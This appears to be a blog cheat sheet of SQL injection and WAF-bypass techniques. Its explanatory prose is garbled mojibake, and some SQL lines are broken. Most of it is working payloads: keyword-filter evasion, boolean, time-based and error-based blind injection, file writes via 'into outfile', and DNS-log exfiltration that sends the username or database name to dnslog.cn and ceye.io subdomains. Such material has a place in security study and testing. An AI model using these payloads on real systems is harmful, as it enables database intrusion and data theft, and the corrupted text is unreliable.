<h2 id="åŒå†™ç»•è¿‡ï¼š"><a href="#åŒå†™ç»•è¿‡ï¼š" class="headerlink" title="åŒå†™ç»•è¿‡ï¼š"></a>åŒå†™ç»•è¿‡ï¼š</h2><p>uniunionon select â€¦ &#x2F;&#x2F;éƒ¨åˆ†ç¨‹åºè®¾ç½®äº†å…³é”®è¯é»‘åå•ï¼Œé€šè¿‡åŒå†™å…³é”®å­—ç»•è¿‡</p>
<h2 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h2><p>Union seLect â€¦ &#x2F;&#x2F;é€šè¿‡å¤§å°å†™ç»•è¿‡</p>
<h2 id="urlåŒç¼–ç ç»•è¿‡"><a href="#urlåŒç¼–ç ç»•è¿‡" class="headerlink" title="urlåŒç¼–ç ç»•è¿‡"></a>urlåŒç¼–ç ç»•è¿‡</h2><p>è¿˜å¯é€šè¿‡urlç¼–ç ç»•è¿‡ï¼Œå°†æŸäº›ç‰¹æ®Šå­—ç¬¦ä½¿ç”¨urlç¼–ç ä¼ è¾“</p>
<p>å¦‚æœæœåŠ¡ç«¯æ˜¯æœ‰äº†urldecodeå‡½æ•°åˆ™å¯ä»¥é€šè¿‡è¯¥æ–¹æ³•ç»•è¿‡</p>
<h2 id="å†…è”æ³¨é‡Šç»•è¿‡"><a href="#å†…è”æ³¨é‡Šç»•è¿‡" class="headerlink" title="å†…è”æ³¨é‡Šç»•è¿‡"></a>å†…è”æ³¨é‡Šç»•è¿‡</h2><p>éƒ¨åˆ†ç¨‹åºè¿‡æ»¤äº†ç©ºæ ¼ï¼Œå°†è¾“å…¥é™åˆ¶ä¸ºå•ä¸ªï¼Œåˆ™å¯ä»¥é€šè¿‡å†…è”æ³¨é‡Šç»•è¿‡ è¿˜å¯é€šè¿‡<code>%a0 ,%09,%0a,%0b,%0c,%0d</code>ç»•è¿‡</p>
<p>select * from table where id&#x3D;â€˜1â€™&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;order&#x2F;<strong>&#x2F;by&#x2F;</strong>&#x2F;2</p>
<p>select * from table where id&#x3D;â€™1â€™and&#x2F;<em>!sleep(10)</em>&#x2F;â€”+</p>
<h2 id="ç©ºå­—èŠ‚"><a href="#ç©ºå­—èŠ‚" class="headerlink" title="ç©ºå­—èŠ‚"></a>ç©ºå­—èŠ‚</h2><p>ç”¨äºç»•è¿‡ä¸€äº›å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œå¦‚ids ipsç­‰ï¼Œè¿™äº›æ£€æµ‹ç³»ç»Ÿä¸€èˆ¬éƒ½æ˜¯ç”¨åŸç”Ÿè¯­è¨€ç¼–å†™çš„ï¼Œè€Œè¿™äº›è¯­è¨€æ£€éªŒå­—ç¬¦ä¸²çš„ç»“å°¾æ˜¯é€šè¿‡æ£€æµ‹ç©ºå­—èŠ‚ï¼Œåœ¨è¢«æ£€æµ‹ç³»ç»Ÿæ£€æµ‹çš„å­—ç¬¦å‰é¢åŠ ä¸Šä¸€ä¸ªç©ºå­—èŠ‚å°±å¯ä»¥æ¬ºéª—æ£€æµ‹ç³»ç»Ÿå¿½ç•¥è¢«æ£€æµ‹å­—ç¬¦ã€‚%00-ç©ºå­—èŠ‚</p>
<h2 id="åŒè¯·æ±‚ç»•è¿‡"><a href="#åŒè¯·æ±‚ç»•è¿‡" class="headerlink" title="åŒè¯·æ±‚ç»•è¿‡"></a>åŒè¯·æ±‚ç»•è¿‡</h2><p>æœ‰çš„åå°å¤„ç†åŒæ—¶ä½¿ç”¨äº†getä¸postä¸¤ç§æ–¹å¼ï¼Œä½†åªå¯¹å…¶ä¸­ä¸€ç§æ–¹å¼ä¼ å‚è¿›è¡Œäº†å¤„ç†ï¼Œå°±å¯ä»¥ç»•è¿‡</p>
<h2 id="å¼‚å¸¸è¯·æ±‚æ–¹å¼ç»•è¿‡"><a href="#å¼‚å¸¸è¯·æ±‚æ–¹å¼ç»•è¿‡" class="headerlink" title="å¼‚å¸¸è¯·æ±‚æ–¹å¼ç»•è¿‡"></a>å¼‚å¸¸è¯·æ±‚æ–¹å¼ç»•è¿‡</h2><p>å°†è¯·æ±‚æ–¹å¼æ›´æ”¹ä¸ºä»»æ„ä¸å­˜åœ¨çš„ï¼Œåªé’ˆå¯¹ç‰¹æ®Šæƒ…å†µå¯ä»¥ç»•è¿‡</p>
<h2 id="è¶…å¤§æ•°æ®åŒ…ç»•è¿‡"><a href="#è¶…å¤§æ•°æ®åŒ…ç»•è¿‡" class="headerlink" title="è¶…å¤§æ•°æ®åŒ…ç»•è¿‡"></a>è¶…å¤§æ•°æ®åŒ…ç»•è¿‡</h2><p>ä¸ºäº†æ€§èƒ½ï¼Œæœ‰äº›wafä¸ä¼šå¯¹è¶…å¤§çš„æ•°æ®åŒ…è¿›è¡Œæ£€éªŒï¼Œä»–ä»¬ä¼šå…ˆåˆ¤æ–­æ•°æ®åŒ…çš„é•¿åº¦ï¼Œåªæœ‰ç¬¦åˆé•¿åº¦è¦æ±‚çš„åŒ…æ‰è¢«æ£€éªŒï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ è¶…é•¿çš„åƒåœ¾æ•°æ®åŒ…æ¥ç»•è¿‡æ£€æŸ¥ã€‚</p>
<h2 id="å¤å‚æ•°ç»•è¿‡"><a href="#å¤å‚æ•°ç»•è¿‡" class="headerlink" title="å¤å‚æ•°ç»•è¿‡"></a>å¤å‚æ•°ç»•è¿‡</h2><p>å°†ä¸€ä¸ªå‚æ•°ä¼ ä¸¤ä¾§ï¼Œ<code>id=1&amp;id=1 order by 5</code> é‚£ä¹ˆè¿‡æ»¤çš„æ—¶å€™å¯èƒ½å–ç¬¬ä¸€ä¸ªidï¼Œè®¡ç®—çš„æ—¶å€™åˆ™å¯èƒ½å–ç¬¬äºŒä¸ªidï¼Œé€»è¾‘ä¸¥æ ¼ä¸€ç‚¹å°±ä¸ä¼šæœ‰è¿™ä¸ªé—®é¢˜ï¼Œå…ˆå–å‡ºæ¥å†èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ï¼Œé€šè¿‡è¿™ä¸ªå˜é‡æ¯”è¾ƒå°±å¯ä»¥é¿å…è¿™ä¸ªé—®é¢˜ã€‚</p>
<h2 id="æ·»åŠ -ç»•è¿‡"><a href="#æ·»åŠ -ç»•è¿‡" class="headerlink" title="æ·»åŠ %ç»•è¿‡"></a>æ·»åŠ %ç»•è¿‡</h2><p>å†iisä¸­çš„asp.dllä¸­å¯¹å‚æ•°ä¸­çš„%ä¼šç›´æ¥å½“ä½œurlç¼–ç çš„ä¸€éƒ¨åˆ†è¢«å»æ‰ã€‚</p>
<h2 id="pipelineç»•è¿‡"><a href="#pipelineç»•è¿‡" class="headerlink" title="pipelineç»•è¿‡"></a>pipelineç»•è¿‡</h2><p>å°†è¯·æ±‚å­—æ®µconnectionæ”¹ä¸ºkeep-liveé•¿è¿æ¥ï¼Œå¹¶å…³é—­bp repeteræ¨¡å—çš„å†…å®¹é•¿åº¦è‡ªåŠ¨æ›´æ–°ï¼Œå°†æ”»å‡»çš„è¯·æ±‚ç²˜è´´åœ¨æ­£å¸¸è¯·æ±‚çš„åé¢é‡å¤å‘ä¸€æ¬¡å°±å¯èƒ½æˆåŠŸã€‚å¦‚æœwafåªå¯¹ç¬¬ä¸€æ¬¡çš„è¯·æ±‚è¿‡æ»¤ï¼Œåˆ™ä¼šç»•è¿‡</p>
<h2 id="å…³é”®è¯æ›¿æ¢"><a href="#å…³é”®è¯æ›¿æ¢" class="headerlink" title="å…³é”®è¯æ›¿æ¢"></a>å…³é”®è¯æ›¿æ¢</h2><p>åœ¨å…³é”®è¯ä¸­æ’å…¥ä¼šè¢«è¿‡æ»¤çš„å­—ç¬¦<code>sel&lt;ect</code></p>
<h2 id="ç©ºæ ¼è¢«è¿‡æ»¤é€šè¿‡æ‹¬å·ç»•è¿‡"><a href="#ç©ºæ ¼è¢«è¿‡æ»¤é€šè¿‡æ‹¬å·ç»•è¿‡" class="headerlink" title="ç©ºæ ¼è¢«è¿‡æ»¤é€šè¿‡æ‹¬å·ç»•è¿‡"></a>ç©ºæ ¼è¢«è¿‡æ»¤é€šè¿‡æ‹¬å·ç»•è¿‡</h2><p>å¦‚æœç©ºæ ¼è¢«è¿‡æ»¤ï¼Œå¯ä»¥è®²æ¯ä¸ªéƒ¨åˆ†é€šè¿‡()æ‹¬èµ·æ¥ï¼Œè¿™æ ·å°±ä¸éœ€è¦ç©ºæ ¼çš„å‚ä¸ã€‚</p>
<p>ä½¿ç”¨ç©ºç™½å­—ç¬¦<code>a0 ,%09,%0a,%0b,%0c,%0d</code></p>
<h2 id="åˆ†å—ä¼ è¾“ç»•è¿‡"><a href="#åˆ†å—ä¼ è¾“ç»•è¿‡" class="headerlink" title="åˆ†å—ä¼ è¾“ç»•è¿‡"></a>åˆ†å—ä¼ è¾“ç»•è¿‡</h2><p>åˆ†å—ä¼ è¾“ç¼–ç æ˜¯HTTPçš„ä¸€ç§æ•°æ®ä¼ è¾“æœºåˆ¶ï¼Œå…è®¸å°†æ¶ˆæ¯ä½“åˆ†æˆè‹¥å¹²å—è¿›è¡Œå‘é€ã€‚å½“æ•°æ®è¯·æ±‚åŒ…ä¸­headerä¿¡æ¯å­˜åœ¨Transfer-Encoding: chunkedï¼Œå°±ä»£è¡¨è¿™ä¸ªæ¶ˆæ¯ä½“é‡‡ç”¨äº†åˆ†å—ç¼–ç ä¼ è¾“ã€‚åªèƒ½é€ƒè¿‡wafï¼Œä¸èƒ½ç»•è¿‡è½¯ä»¶æœ¬èº«çš„è¿‡æ»¤ç­–ç•¥ï¼Œæœ¬è´¨æ˜¯æ‰“æ–­äº†æ•°æ®ï¼Œè¿™æ ·è¯·æ±‚ä½“å°±ä¸å®Œæ•´äº†ï¼Œè¿‡æ»¤è§„åˆ™å°±åŒ¹é…ä¸åˆ°ï¼Œäºæ˜¯æˆåŠŸç»•è¿‡</p>
<h2 id="é€—å·è¢«è¿‡æ»¤ç»•è¿‡"><a href="#é€—å·è¢«è¿‡æ»¤ç»•è¿‡" class="headerlink" title="é€—å·è¢«è¿‡æ»¤ç»•è¿‡"></a>é€—å·è¢«è¿‡æ»¤ç»•è¿‡</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr(database() from 1 to 1);</span><br><span class="line">select mid(database() from 1 to 1);</span><br></pre></td></tr></table></figure>

<h3 id="ç¼–ç å­—ç¬¦ä¸²ç»•è¿‡"><a href="#ç¼–ç å­—ç¬¦ä¸²ç»•è¿‡" class="headerlink" title="ç¼–ç å­—ç¬¦ä¸²ç»•è¿‡"></a>ç¼–ç å­—ç¬¦ä¸²ç»•è¿‡</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. char       select(char(67,58,45,56,67,45,35,44,3));2. 16è¿›åˆ¶ç¼–ç     0x234532e34f2a34b3. hex4. unhex   select convert(unhex(&#x27;e3f23a44b445&#x27;)using utf8)5. to_base64(),from_base64()6. sleep benchmark</span><br></pre></td></tr></table></figure>

<h3 id="å­—ç¬¦è¿‡æ»¤ç»•è¿‡"><a href="#å­—ç¬¦è¿‡æ»¤ç»•è¿‡" class="headerlink" title="å­—ç¬¦è¿‡æ»¤ç»•è¿‡"></a>å­—ç¬¦è¿‡æ»¤ç»•è¿‡</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and â‡’ &amp;&amp;or =&gt; ||&lt; &gt; = =&gt; between() ,likelimit 0,1  =&gt; limit 0 offset 1 limit 1substr =&gt; substring midsleep =&gt; benchmarkspace =&gt; +</span><br></pre></td></tr></table></figure>

<h2 id="äºŒé˜¶æ³¨å…¥"><a href="#äºŒé˜¶æ³¨å…¥" class="headerlink" title="äºŒé˜¶æ³¨å…¥"></a>äºŒé˜¶æ³¨å…¥</h2><p>å…ˆé€šè¿‡æ­£å¸¸é€”å¾„å°†sqlä»£ç å†™å…¥æ•°æ®åº“å­˜å‚¨èµ·æ¥ï¼Œåœ¨é€šè¿‡ç¬¬äºŒæ¬¡æŸ¥è¯¢æ“ä½œæ‰§è¡Œè¯¥è¯­å¥</p>
<p>åˆ¤æ–­æ•°æ®åº“ç±»å‹</p>
<p>æ ¹æ®é”™è¯¯æç¤ºåˆ¤æ–­:oraå¼€å¤´çš„ä¸ºoracleæ•°æ®åº“</p>
<p><code>id=1 and connection_id()</code></p>
<p><code>id=1 and last_insert_id()</code></p>
<p>ç¬¬ä¸€ä¸ªè¿”å›æ­£å¸¸ï¼Œç¬¬äºŒä¸ªä¸è¿”å›æ•°æ®ï¼Œæ¨æ–­ä¸ºmysql</p>
<h2 id="æ‹†åˆ†ä»£ç æ³¨å…¥"><a href="#æ‹†åˆ†ä»£ç æ³¨å…¥" class="headerlink" title="æ‹†åˆ†ä»£ç æ³¨å…¥"></a>æ‹†åˆ†ä»£ç æ³¨å…¥</h2><p>å°†ä¸€æ®µå®Œæ•´çš„payloadï¼Œæ‹†åˆ†ä¸ºå‡ æ®µï¼Œåˆ†åˆ«è¿›è¡Œæ³¨å…¥ï¼Œæœ€åå½¢æˆä¸€æ®µå®Œæ•´çš„ä»£ç  &#x2F;&#x2F;å­˜å‚¨å‹xss</p>
<h2 id="limitå­å¥ä¸­çš„æ³¨å…¥"><a href="#limitå­å¥ä¸­çš„æ³¨å…¥" class="headerlink" title="limitå­å¥ä¸­çš„æ³¨å…¥"></a>limitå­å¥ä¸­çš„æ³¨å…¥</h2><p>ä½¿ç”¨procedure</p>
<p>å¦‚æœä¸å­˜åœ¨order byå­å¥å¯ä½¿ç”¨è”åˆæŸ¥è¯¢æ³¨å…¥</p>
<p>å¦‚æœå­˜åœ¨åˆ™éœ€ä½¿ç”¨procedure</p>
<p>æŠ¥é”™</p>
<p>select * from table order by name limit 0,1 procedure analyse(exractvalue(1,concat(0x3a,version())),1)</p>
<p>å»¶æ—¶</p>
<p>select id from users order by id limit 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(if(mid(version(),1,1) like 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</p>
<p>è¯¥æ–¹æ³•å­˜åœ¨ç‰ˆæœ¬é™åˆ¶ï¼Œåªèƒ½ç”¨äº5.0-5.6ä¹‹é—´çš„ç‰ˆæœ¬</p>
<h2 id="å¸¸ç”¨å†…ç½®å‡½æ•°"><a href="#å¸¸ç”¨å†…ç½®å‡½æ•°" class="headerlink" title="å¸¸ç”¨å†…ç½®å‡½æ•°"></a>å¸¸ç”¨å†…ç½®å‡½æ•°</h2><p>@@version &#x2F;&#x2F;æ•°æ®åº“ç‰ˆæœ¬å·</p>
<p>@@datadir</p>
<p>@@basedir</p>
<p>@@version_compile_os</p>
<p>user() &#x2F;&#x2F;å½“å‰ç™»å½•ç”¨æˆ·</p>
<p>database() &#x2F;&#x2F;æ•°æ®åº“å</p>
<p>current_user()</p>
<p>system_user()</p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled.png</p>
<p>select â€œâ€ &gt; ç»å¯¹è·¯å¾„ &#x2F;&#x2F;æ’å…¥æ–‡ä»¶</p>
<p>select â€œâ€ into outfile ç»å¯¹è·¯å¾„ &#x2F;&#x2F;æ’å…¥æ–‡ä»¶</p>
<h1 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h1><h2 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h2><p>id&#x3D;1 and SUBSTRING(user(),<em>num</em>,â€†1)â€„&#x3D;â€„â€²chrâ€™</p>
<p>å‡½æ•°å¯ä½¿ç”¨ï¼šsubstr length ascii</p>
<p>å¦‚æœç›¸ç­‰åˆ™è¿”å›æ­£ç¡®çš„æ‰§è¡Œç»“æœ</p>
<p>å¦‚æœä¸ç›¸ç­‰åˆ™è¿”å›é»˜è®¤çš„é”™è¯¯æç¤ºé¡µæˆ–è€…åŸç”Ÿé”™è¯¯æç¤ºã€‚</p>
<h2 id="åŸºäºæ—¶é—´çš„ç›²æ³¨"><a href="#åŸºäºæ—¶é—´çš„ç›²æ³¨" class="headerlink" title="åŸºäºæ—¶é—´çš„ç›²æ³¨"></a>åŸºäºæ—¶é—´çš„ç›²æ³¨</h2><p>id&#x3D;1 union select if(substring(user() ,<em>num</em>,â€†1)&#x3D;chr,sleep(5),1),null,null</p>
<p>if (length(user())&#x3D;5,sleep(5),1)</p>
<p>if(hex(mid(user(),1,1))&#x3D;1,sleep(5),1)</p>
<p>if(left(user(),3)&#x3D;â€œhrxâ€,sleep(5),1)</p>
<p>strcmp(left((select database()),1),0x6d)&#x3D;1</p>
<p>å¦‚æœç›¸ç­‰åˆ™æš‚åœ5ç§’</p>
<p>å¦‚æœä¸ç›¸ç­‰åˆ™è¿”å›1</p>
<h2 id="åŸºäºæŠ¥é”™çš„"><a href="#åŸºäºæŠ¥é”™çš„" class="headerlink" title="åŸºäºæŠ¥é”™çš„"></a>åŸºäºæŠ¥é”™çš„</h2><p>æ ¹æ®æŠ¥é”™ä¿¡æ¯çŒœæµ‹è¯­æ³•ç»“æ„</p>
<p>updatexml(1,payload,1)</p>
<p>extractvalue(1,payload)</p>
<h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><p>å¦‚æœmysqlå¾—å­—ç¬¦é›†ä½¿GBKç­‰å®½å­—èŠ‚å­—ç¬¦é›†å¾—è¯</p>
<p>phpå¦‚æœå¼€å¯äº†magic_quotes_gpcåŠŸèƒ½ï¼Œé‚£ä¹ˆé€šè¿‡_GET,_POST,_COOKIEæ–¹æ³•ä¼ å…¥çš„å‚æ•°ä¸­çš„â€™,â€,null,&#x2F;è½¬ä¹‰ï¼Œæ­¤æ—¶å°±ä¸èƒ½å®Œæˆæ³¨å…¥ï¼Œæˆ‘ä¹ˆä½ å¯ä»¥è¿™æ ·æ„é€ æ³¨å…¥å‚æ•°id&#x3D;%4dâ€™,è¿™æ ·çš„å‚æ•°åé¢çš„â€™ä¸ä¼šè¢«è½¬ä¹‰ï¼Œä»è€Œè¾¾åˆ°æ³¨å…¥çš„ç›®çš„</p>
<p>é«˜å­—èŠ‚%e6 %df</p>
<h2 id="é•¿å­—ç¬¦ä¸²æˆªæ–­"><a href="#é•¿å­—ç¬¦ä¸²æˆªæ–­" class="headerlink" title="é•¿å­—ç¬¦ä¸²æˆªæ–­"></a>é•¿å­—ç¬¦ä¸²æˆªæ–­</h2><p>mysqlåœ¨æ²¡æœ‰å¼€å¯ä¸¥æ ¼æ¨¡å¼çš„æƒ…å†µä¸‹ï¼Œå¯¹äºæ’å…¥é•¿åº¦è¶…è¿‡å­—ç¬¦é•¿åº¦é™åˆ¶çš„æ•°æ®å¹¶ä¸ä¼šæŠ¥é”™è€Œæ˜¯è­¦å‘Šï¼Œä½†æ•°æ®å·²ç»æˆåŠŸæ’å…¥ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œåˆ›å»ºä¸€ä¸ªé•¿åº¦è¶…è¿‡é™åˆ¶çš„ç”¨æˆ·ååé¢æ’å…¥å¾ˆå¤šå¾—ç©ºæ ¼ï¼Œå½“ç„¶è¿™ä¸ªç”¨æˆ·åå¾—å’Œç®¡ç†å‘˜å¾—ç”¨æˆ·åç›¸åŒï¼Œä½†åé¢å´å¤šäº†ä¸€é•¿ä¸²å¾—ç©ºæ ¼ï¼Œå› ä¸ºé•¿åº¦è¶…å‡ºé™åˆ¶ï¼Œå¤šä½™çš„éƒ¨åˆ†è¢«æˆªæ–­ï¼Œä½†æ­¤æ—¶æˆ‘ä»¬æŸ¥è¯¢æ•°æ®å¯ç®¡ç†å‘˜çš„è´¦æˆ·çš„æ—¶å€™ï¼Œå°†åŒæ—¶æŸ¥è¯¢åˆ°è¿™ä¸¤ä¸ªå€¼ï¼Œäºæ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æˆ‘ä»¬æ–°åˆ›å»ºçš„è¿™ä¸ªç”¨æˆ·ç™»å½•ç®¡ç†å‘˜çš„åå°ã€‚</p>
<h2 id="ç™½åå•ç»•è¿‡"><a href="#ç™½åå•ç»•è¿‡" class="headerlink" title="ç™½åå•ç»•è¿‡"></a>ç™½åå•ç»•è¿‡</h2><p>#é”šç‚¹ åé¢çš„å†…å®¹ä¸ä¼šå‘é€åˆ°åå°</p>
<h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><ol>
<li><p><strong>é€šè¿‡group by çš„ç‰¹æ€§</strong></p>
<p> group by åœ¨åˆ†ç»„çš„æ—¶å€™æœ‰ä¸¤æ¬¡è®¡ç®—è¿‡ç¨‹</p>
<p> ç¬¬ä¸€æ¬¡ï¼Œè®¡ç®—ä¹‹åä¸è™šæ‹Ÿè¡¨ä¸­çš„å­—æ®µè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœè™šæ‹Ÿè¡¨ä¸­æ²¡æœ‰åˆ™æ’å…¥ï¼Œå¦‚æœæœ‰åˆ™+1</p>
<p> ç¬¬äºŒæ¬¡ï¼Œæ’å…¥è¿‡ç¨‹ï¼Œç»è¿‡ç¬¬ä¸€æ¬¡æŸ¥è¯¢è™šæ‹Ÿè¡¨ä¹‹åï¼Œå‘ç°è™šæ‹Ÿè¡¨ä¸­æ²¡æœ‰è¯¥è®°å½•ï¼Œå‡†å¤‡æ’å…¥ï¼Œè¿™æ—¶åˆå†ä¸€æ¬¡è®¡ç®—ï¼Œä½†æ˜¯å› ä¸ºrand å‡½æ•°ç”Ÿæˆçš„å€¼æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡å’Œç¬¬äºŒæ¬¡è®¡ç®—çš„ç»“æœå¯èƒ½ä¸ä¸€æ ·ï¼Œä½†æ•°æ®åº“ä¸çŸ¥é“ä¸¤æ¬¡ç»“æœä¸ä¸€è‡´ï¼Œä»ç„¶è¿›è¡Œæ’å…¥æ“ä½œï¼Œç»“æœå°±å¯¼è‡´ï¼Œæ’å…¥çš„åˆ—é‡å¤ï¼Œå› ä¸ºæ˜¯ä¸»é”®æ‰€ä»¥ä¸èƒ½é‡å¤ä¼šæŠ¥é”™ã€‚</p>
<p> <code>select count(*),concat(database(),&quot;@&quot;,@@version,floor(rand(0)*2))x from information_schema.tables group by x</code></p>
</li>
<li><p>updatexml| extractvalue</p>
<p> è¿™ä¸¤ä¸ªå‡½æ•°éƒ½æ˜¯xmlæ›¿æ¢å‡½æ•°ï¼Œå…¶ä¸­çš„xpathè¯­æ³•å¦‚æœå‡ºé”™å°±ä¼šå°†æŸ¥è¯¢ç»“æœä»¥é”™è¯¯çš„æ–¹å¼æ˜¾ç¤ºå‡ºæ¥</p>
</li>
<li><p>åŸºäºå‡ ä½•å‡½æ•°</p>
<ol>
<li>geometrycollection:å­˜å‚¨ä»»æ„é›†åˆå›¾å½¢çš„é›†åˆ</li>
<li>multipoint:å­˜å‚¨å¤šä¸ªç‚¹</li>
<li>polygon:å¤šè¾¹å½¢</li>
<li>multipolygon:å¤šä¸ªå¤šè¾¹å½¢</li>
<li>linstringï¼šçº¿</li>
<li>multilinestringï¼šå¤šæ¡çº¿</li>
<li>pointï¼šç‚¹</li>
</ol>
<p> payload:</p>
<p> <code>select * from from test where id=1 and mutilinestring((select*from(select * from (select user())a)b)))</code> &#x2F;&#x2F;æ„é€ è¯­æ³•éƒ½æ˜¯è¿™æ ·ã€‚</p>
<p> åªè¦ä¸Šè¿°å‡½æ•°ä¸­çš„å‚æ•°ä¸æ˜¯é›†åˆå½¢çŠ¶æ•°æ®ï¼Œå°±ä¼šæŠ¥é”™ã€‚æœ‰mysqlç‰ˆæœ¬é™åˆ¶ã€‚
 </p>
</li>
<li><p>åŸºäºåˆ—å‘½å†²çª</p>
<p> name-constï¼šè¯¥å‡½æ•°å¯ä»¥æ‰‹åŠ¨åˆ›å»ºä¸€ä¸ªåˆ—ï¼Œåœ¨mysqlä¸­å¦‚æœåˆ—å‘½å†²çªåˆ™ä¼šå¯¼è‡´æŠ¥é”™ï¼Œå¯ä»¥é…å’Œjoinå…¨è¿æ¥æ¥æ“ä½œï¼Œå…¨æ¥è¿æ¥ä¼šè¿æ¥ä¸¤ä¸ªè¡¨ï¼Œè¯¥æ–¹æ³•å¯ä»¥ç”¨æ¥çˆ†åˆ—åã€‚</p>
<p> <code>and exists(select * from (select * from (select name_const(@@version,0)) a join (select name_const(@@version,0))b)c&gt;;</code></p>
<p> ä¹Ÿå¯ä»¥å•ç‹¬ä½¿ç”¨join,åªéœ€è¦ä¿è¯joinä¸¤è¾¹çš„å€¼ä¸€æ ·å°±ä¼šå¯¼è‡´æŠ¥é”™ï¼š</p>
<p> <code>select * from (select * from mysql.user a join musql.user b)c;</code></p>
</li>
<li><p>åŸºäºæ•°æ®æº¢å‡º</p>
<p> ~ï¼šæŒ‰ä½å–å</p>
<p> exp(3)ï¼šè‡ªç„¶å¯¹æ•°çš„3æ¬¡æ–¹ï¼Œå¾ˆå®¹æ˜“å°±æº¢å‡ºäº†</p>
<p> <code>select * from test where id=1 and exp(~(select * from (select user())a));</code></p>
<p> ~åçš„å†…å®¹è¢«å–ååä¼šå¾—åˆ°ä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œå†åšä¸ºè‡ªç„¶å¯¹æ•°çš„æŒ‡æ•°ï¼Œå¾—åˆ°çš„å€¼ä¸€å®šä¼šæº¢å‡ºï¼Œä»è€ŒæŠ¥é”™å°†æŸ¥è¯¢ç»“æœæ˜¾ç¤ºå‡ºæ¥ï¼Œä½†è²Œä¼¼è¯¥æ–¹æ³•æœ‰ç‰ˆæœ¬é™åˆ¶</p>
</li>
</ol>
<h2 id="DNSLOG"><a href="#DNSLOG" class="headerlink" title="DNSLOG"></a>DNSLOG</h2><p>æˆ‘ä»¬åœ¨å‘èµ·ç½‘ç»œè¯·æ±‚çš„æ—¶å€™ï¼Œç¬¬ä¸€æ­¥å°±æ˜¯è§£æåŸŸåï¼Œå½“åŸŸåè¢«æˆåŠŸè§£æçš„æ—¶å€™ï¼Œè¯¥åŸŸåè§£æç»“æœå°†è¢«åŸŸåæœåŠ¡å™¨è®°å½•ä¸‹æ¥ï¼Œæˆ‘ä»¬åˆ©ç”¨çš„æ­£æ˜¯è¿™ä¸€ç‚¹ï¼Œè®²æˆ‘ä»¬æƒ³è¦çš„æ•°æ®æ”¾åœ¨åŸŸåçš„ä¸‹ä¸€çº§åŸŸä¸­å¤–å¸¦åˆ°åŸŸåæœåŠ¡å™¨ï¼Œé€šè¿‡æŸ¥è¯¢åŸŸåæœåŠ¡å™¨çš„æ—¥å¿—ï¼Œä»è€Œè·å¾—æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ï¼Œå¦‚æˆ‘ä»¬ä½¿ç”¨<a href="http://www.dnslog.cn/">www.dnslog.cn</a> è¿™ä¸ªç½‘ç«™æ¥æµ‹è¯•ï¼Œ</p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%201.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled%201.png</p>
<p>ç‚¹å‡»è·å–å­åŸŸåè·å–ä¸€ä¸ªåŒ…å«ä¸‰çº§åŸŸåçš„åŸŸåç»™æˆ‘ä»¬ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨pingå‘½ä»¤åšæµ‹è¯•</p>
<p><code>ping %USERNAME%.4ap7wz.dnslog.cn</code></p>
<p>å½“pingé€šçš„æ—¶å€™ï¼Œæˆ‘ä»¬ç‚¹å‡»è¯¥ç½‘ç«™çš„åˆ·æ–°è®°å½•å°±å¯ä»¥çœ‹åˆ°æˆ‘æµ‹è¯•ä¸»æœºçš„ç”¨æˆ·åarmandheäº†ã€‚</p>
<p>è¯¥æ³¨å…¥æ–¹æ³•é€‚ç”¨äºéœ€è¦æ—¶é—´ç›²æ³¨ã€æ²¡æœ‰å›æ˜¾çš„æ³¨å…¥åœºæ™¯ã€‚æ„é€ mysqlè¯­å¥å¦‚ä¸‹ã€‚</p>
<p><code>&#39; and (select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xxxx.ceye.io\\abc&#39;)))</code></p>
<p>åªèƒ½åº”ç”¨äºwindowså¹³å°ï¼Œé¸¡è‚‹</p>
